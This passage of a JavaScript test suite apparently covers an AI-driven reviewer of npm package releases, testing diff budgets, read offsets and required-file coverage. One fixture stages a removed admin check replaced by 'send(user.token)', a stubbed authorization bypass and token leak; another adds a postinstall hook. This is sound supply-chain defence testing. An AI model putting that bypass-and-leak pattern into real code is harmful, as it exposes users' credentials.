    // The finding's reported path reads the same file.
    const tools = createAiReviewTools(options, () => {});
    const read = await tools.read.execute({ paths: [findingFile], maxChars: 2_000 });
    expect(read.results[0].path).toBe("sdist/setup.py");
    expect(read.unreadRequiredPaths).toEqual([]);

    delete options.findingPathAliases;
    expect(buildAiReviewPayload(options).requiredEvidencePaths).toEqual([]);
  });

  test("one diff budget bounds a review; files past it list removed and added lines", () => {
    const lines = (prefix) => Array.from({ length: 1_200 }, (_, i) => `${prefix}${i}`).join("\n");
    const paths = Array.from({ length: 30 }, (_, i) => `src/f${String(i).padStart(2, "0")}.js`);
    const options = {
      ecosystem: "npm",
      files: paths.map((path) => file(path, lines("  b"))),
      previousFiles: paths.map((path) => file(path, lines("a"))),
      diff: paths.map((path) => ({ path, status: "modified", flags: [] })),
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    };
    const session = createAiReviewSession(options, () => {});
    const results = session.seedCoverageRead().flatMap((call) => call.output.results);

    expect(results).toHaveLength(30);
    expect(results[0].note).toContain("Too many changed lines");
    const spent = results.filter((result) => result.note?.includes("budget is spent"));
    expect(spent.length).toBeGreaterThan(20);
    for (const result of results) {
      expect(result.kind).toBe("diff");
      expect(result.content).toContain("@@ lines only in the previous version @@\n-a0\n");
    }
  });

  test("a budget-burning bundle cannot hide a later file's removed check", async () => {
    const bundle = (prefix) => Array.from({ length: 2_000 }, (_, i) => `${prefix}${i}`).join("\n");
    const auth = (body) =>
      Array.from({ length: 300 }, (_, i) => `const filler${i} = ${i};`).join("\n") + body;
    const options = {
      ecosystem: "npm",
      files: [
        file("dist/a.js", bundle("new")),
        file("lib/auth.js", auth("\nexport function act(user) {\n  send(user.token);\n}\n")),
      ],
      previousFiles: [
        file("dist/a.js", bundle("old")),
        file(
          "lib/auth.js",
          auth("\nexport function act(user) {\n  if (!user.isAdmin) throw new Error('no');\n}\n"),
        ),
      ],
      diff: [
        { path: "dist/a.js", status: "modified", flags: [] },
        { path: "lib/auth.js", status: "modified", flags: [] },
      ],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    };
    const tools = createAiReviewTools(options, () => {});
    const results = (
      await tools.read.execute({ paths: ["dist/a.js", "lib/auth.js"], maxChars: 8_000 })
    ).results;
    const authResult = results.find((result) => result.path === "lib/auth.js");
    expect(authResult.content).toContain("-  if (!user.isAdmin) throw new Error('no');");
    expect(authResult.content).toContain("+  send(user.token);");
  });

  test("a line-ending flip reads as no line change", async () => {
    const body = Array.from({ length: 2_500 }, (_, i) => `line ${i}`);
    const options = {
      ecosystem: "npm",
      files: [file("crlf.js", body.join("\r\n"))],
      previousFiles: [file("crlf.js", body.join("\n"))],
      diff: [{ path: "crlf.js", status: "modified", flags: [] }],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    };
    const tools = createAiReviewTools(options, () => {});
    const result = (await tools.read.execute({ paths: ["crlf.js"], maxChars: 1_000 })).results[0];
    expect(result.content).toBe("@@ no line differs except in order or line endings @@\n");
  });

  test("a required file the budget cannot finish is not owed", async () => {
    const hook = "z".repeat(MAX_TOTAL_TOOL_RESPONSE_CHARS);
    const packageJson = JSON.stringify({ name: "f", scripts: { postinstall: "node hook.js" } });
    const options = addedRelease(
      [
        ["package.json", packageJson],
        ["hook.js", hook],
      ],
      {
        packageJsonDiff: {
          ...EMPTY_PACKAGE_JSON_DIFF,
          scripts: [{ key: "postinstall", status: "added", staged: "node hook.js" }],
        },
      },
    );
    const submitted = [];
    const session = createAiReviewSession(options, (review) => submitted.push(review));
    const calls = session.seedCoverageRead();
    expect(calls.at(-1).output.unreadRequiredPaths).toEqual([]);
    // Coverage telemetry still counts it as unread.
    expect(session.coverage().requiredPathsUnread).toBe(1);
    const result = await session.tools.submit_review.execute({
      risk: "low",
      releaseAssessment: "nothing_unusual",
      summary: "fine",
      findings: [],
      requiresManualReview: false,
    });
    expect(result.ok).toBe(true);
  });

  test("offset 0 on a batched read continues each path like an omitted offset", async () => {
    const options = addedRelease([
      ["a.js", "a".repeat(3_000)],
      ["b.js", "b".repeat(3_000)],
    ]);
    const tools = createAiReviewTools(options, () => {});
    await tools.read.execute({ paths: ["a.js", "b.js"], maxChars: 1_000 });
    const next = await tools.read.execute({ paths: ["a.js", "b.js"], maxChars: 1_000, offset: 0 });
    expect(next.ok).toBe(true);
    expect(next.results.map((result) => result.offset)).toEqual([1_000, 1_000]);
  });

  test("a file too rewritten for a bounded line diff lists its removed and added lines", async () => {
    const previous = file("gen.js", Array.from({ length: 3_000 }, (_, i) => `a${i}`).join("\n"));
    const staged = file("gen.js", Array.from({ length: 3_000 }, (_, i) => `b${i}`).join("\n"));
    const options = {
      ecosystem: "npm",
      files: [staged],
      previousFiles: [previous],
      diff: [{ path: "gen.js", status: "modified", flags: [] }],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    };
    const tools = createAiReviewTools(options, () => {});
    const result = (await tools.read.execute({ paths: ["gen.js"], maxChars: 100 })).results[0];
    expect(result.kind).toBe("diff");
    expect(result.content.startsWith("@@ lines only in the previous version @@\n-a0\n")).toBe(true);
    expect(result.note).toContain("Too many changed lines");
  });
});
